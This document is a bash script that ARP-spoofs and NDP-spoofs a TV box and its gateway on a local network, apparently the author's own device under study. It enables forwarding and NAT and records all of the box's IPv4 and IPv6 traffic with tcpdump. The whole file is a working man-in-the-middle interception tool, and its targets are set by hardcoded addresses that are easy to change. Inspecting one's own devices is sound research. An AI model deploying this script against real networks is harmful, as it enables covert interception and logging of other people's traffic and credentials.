#!/bin/bash
# eyes2.sh — ARP+NDP spoof the TV box, log ALL its traffic (v4+v6), time-boxed.
# Usage: sudo bash ~/tvbox/ssrf/eyes2.sh [minutes]
set -u
BOX=192.0.2.125
BOX6=2408:8214:b43:2e90:639:26ff:fea8:5cb2
GW=192.0.2.1
IF=enp1s0
MIN=${1:-10}
LOG=~/tvbox/ssrf/eyes2.log
BOXMAC=$(awk -v i="$BOX" '$1==i {print $3; exit}' <(arp -n))
GWMAC=$(awk -v i="$GW" '$1==i {print $3; exit}' <(arp -n))
MYMAC=$(cat /sys/class/net/$IF/address)
[ -z "$BOXMAC" ] && { ping -c1 -W1 $BOX >/dev/null 2>&1; BOXMAC=$(awk -v i="$BOX" '$1==i {print $3; exit}' <(arp -n)); }
[ -z "$BOXMAC" ] && { echo "box not in ARP, aborting"; exit 1; }
echo "box=$BOX/$BOXMAC gw=$GW/$GWMAC me=$MYMAC for ${MIN}min"

echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s $BOX/32 -o $IF -j MASQUERADE
iptables -I FORWARD 1 -s $BOX -j ACCEPT
iptables -I FORWARD 1 -d $BOX -j ACCEPT
ip6tables -I FORWARD 1 -s $BOX6 -j ACCEPT 2>/dev/null
ip6tables -I FORWARD 1 -d $BOX6 -j ACCEPT 2>/dev/null

cleanup() {
  echo; echo "[*] restoring..."
  kill $SP1 $SP2 $SP3 $TCP 2>/dev/null
  python3 ~/tvbox/ssrf/minispoof.py $IF $GWMAC $BOX $GW 4 &
  python3 ~/tvbox/ssrf/minispoof.py $IF $BOXMAC $GW $BOX 4 &
  wait 2>/dev/null
  iptables -t nat -D POSTROUTING -s $BOX/32 -o $IF -j MASQUERADE 2>/dev/null
  iptables -D FORWARD -s $BOX -j ACCEPT 2>/dev/null
  iptables -D FORWARD -d $BOX -j ACCEPT 2>/dev/null
  echo "[*] done -> $LOG"
  exit 0
}
trap cleanup INT TERM

timeout $((MIN*60)) python3 ~/tvbox/ssrf/minispoof.py $IF $MYMAC $BOX $GW 3600 & SP1=$!
timeout $((MIN*60)) python3 ~/tvbox/ssrf/minispoof.py $IF $MYMAC $GW $BOX 3600 & SP2=$!
timeout $((MIN*60)) python3 ~/tvbox/ssrf/ndpspoof.py $IF $MYMAC $BOX6 fe80::7686:6fff:fe50:67a3 3600 & SP3=$!

# ALL traffic to/from the box incl. IPv6 and DNS to any server
timeout $((MIN*60)) tcpdump -i $IF -nn -l \( "ether host $BOXMAC" or "ip6 host $BOX6" \) -A 2>/dev/null | stdbuf -oL cat > "$LOG" &
TCP=$!

echo "[*] watching everything the box sends. Power-cycle it now. Ctrl-C to stop."
wait $TCP
cleanup
